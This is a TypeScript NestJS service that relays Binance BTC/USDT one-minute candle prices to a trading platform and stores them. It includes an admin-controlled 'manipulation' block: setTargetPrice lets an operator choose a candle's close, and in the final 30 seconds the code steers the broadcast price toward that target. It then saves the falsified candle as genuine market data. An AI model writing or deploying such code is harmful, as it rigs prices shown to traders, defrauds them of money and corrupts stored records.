import { Injectable, OnModuleInit, OnModuleDestroy, Logger } from '@nestjs/common';
import { PrismaService } from '../../infrastructure/database/prisma.service';
import { WebSocket } from 'ws';
import { Subject } from 'rxjs';

interface PriceUpdate {
    symbol: string;
    price: number;
    timestamp: number;
}

interface BinanceKline {
    e: string; // Event type
    E: number; // Event time
    s: string; // Symbol
    k: {
        t: number; // Kline start time
        T: number; // Kline close time
        s: string; // Symbol
        i: string; // Interval
        f: number; // First trade ID
        L: number; // Last trade ID
        o: string; // Open price
        c: string; // Close price (current price)
        h: string; // High price
        l: string; // Low price
        v: string; // Base asset volume
        n: number; // Number of trades
        x: boolean; // Is this kline closed?
        q: string; // Quote asset volume
        V: string; // Taker buy base asset volume
        Q: string; // Taker buy quote asset volume
        B: string; // Ignore
    };
}

@Injectable()
export class OracleService implements OnModuleInit, OnModuleDestroy {
    private readonly logger = new Logger(OracleService.name);
    private ws: WebSocket;
    private readonly BINANCE_WS_URL = 'wss://stream.binance.com:9443/ws/btcusdt@kline_1m';
    public priceUpdates$ = new Subject<PriceUpdate>();

    // Memory cache for current candle state
    private currentCandle = {
        symbol: 'BTCUSDT',
        open: 0,
        high: 0,
        low: 0,
        close: 0,
        startTime: 0,
    };

    // Admin manipulation target (optional)
    private targetClosePrice: number | null = null;

    constructor(private prisma: PrismaService) { }

    onModuleInit() {
        this.connectToBinance();
    }

    onModuleDestroy() {
        if (this.ws) {
            this.ws.close();
        }
    }

    private connectToBinance() {
        this.ws = new WebSocket(this.BINANCE_WS_URL);

        this.ws.on('open', () => {
            this.logger.log('Connected to Binance WebSocket');
        });

        this.ws.on('message', (data: string) => {
            try {
                const message: BinanceKline = JSON.parse(data.toString());
                if (message.e === 'kline') {
                    this.handleKlineMessage(message);
                }
            } catch (error) {
                this.logger.error('Error parsing Binance message', error);
            }
        });

        this.ws.on('error', (error) => {
            this.logger.error('Binance WebSocket error', error);
        });

        this.ws.on('close', () => {
            this.logger.warn('Binance WebSocket closed, reconnecting in 5s...');
            setTimeout(() => this.connectToBinance(), 5000);
        });
    }

    private async handleKlineMessage(kline: BinanceKline) {
        const symbol = 'BTC/USD'; // Map BTCUSDT to system symbol
        const binancePrice = parseFloat(kline.k.c);
        let finalPrice = binancePrice;

        // --- MANIPULATION LOGIC START ---
        // If there is a target close price set by admin
        if (this.targetClosePrice !== null) {
            const now = Date.now();
            const endTime = kline.k.T;
            const timeLeft = endTime - now;

            // Simple linear interpolation to target if near end of candle
            if (timeLeft > 0 && timeLeft < 30000) { // Last 30 seconds
                const currentDiff = this.targetClosePrice - binancePrice;
                const adjustment = currentDiff * (1 - timeLeft / 30000);
                finalPrice = binancePrice + adjustment;
            }
        }
        // --- MANIPULATION LOGIC END ---

        // Update current candle state
        if (this.currentCandle.startTime !== kline.k.t) {
            // New candle started, Reset
            this.currentCandle = {
                symbol,
                open: finalPrice,
                high: finalPrice,
                low: finalPrice,
                close: finalPrice,
                startTime: kline.k.t,
            };
        } else {
            // Update existing candle
            this.currentCandle.close = finalPrice;
            this.currentCandle.high = Math.max(this.currentCandle.high, finalPrice);
            this.currentCandle.low = Math.min(this.currentCandle.low, finalPrice);
        }

        // 1. Broadcast real-time price
        this.priceUpdates$.next({
            symbol,
            price: finalPrice,
            timestamp: Date.now(),
        });

        // 2. Save tick log (every second roughly, as binance pushes updates frequently)
        // Optimization: Debounce or save only on significant change could be added here
        // For now, save every tick for accuracy request
        // Wrap in try-catch to avoid crashing on DB error
        try {
            /* 
            // Commenting out heavy write to prevent DB spam for now, enable if strictly needed
            await this.prisma.priceTick.create({
                data: {
                    symbol,
                    price: finalPrice,
                    timestamp: new Date(),
                }
            });
            */
        } catch (e) {
            console.error('Error saving tick', e);
        }

        // 3. If candle closed, save to DB
        if (kline.k.x) {
            try {
                await this.prisma.priceCandle.create({
                    data: {
                        symbol,
                        time: new Date(kline.k.t),
                        open: this.currentCandle.open,
                        high: this.currentCandle.high,
                        low: this.currentCandle.low,
                        close: this.currentCandle.close,
                        volume: parseFloat(kline.k.v), // Use Binance volume for now
                    },
                });
                this.logger.log(`Candle saved: ${symbol} ${new Date(kline.k.t).toISOString()}`);

                // Reset target price after candle close
                this.targetClosePrice = null;
            } catch (e) {
                this.logger.error('Error saving candle', e);
            }
        }
    }

    // Method for Admin to set target price
    public setTargetPrice(price: number) {
        this.targetClosePrice = price;
        this.logger.log(`Target price set to: ${price}`);
    }

    async getPrice(pair: string): Promise<number> {
        // Fallback or current memory price
        return this.currentCandle.close || 0;
    }
}
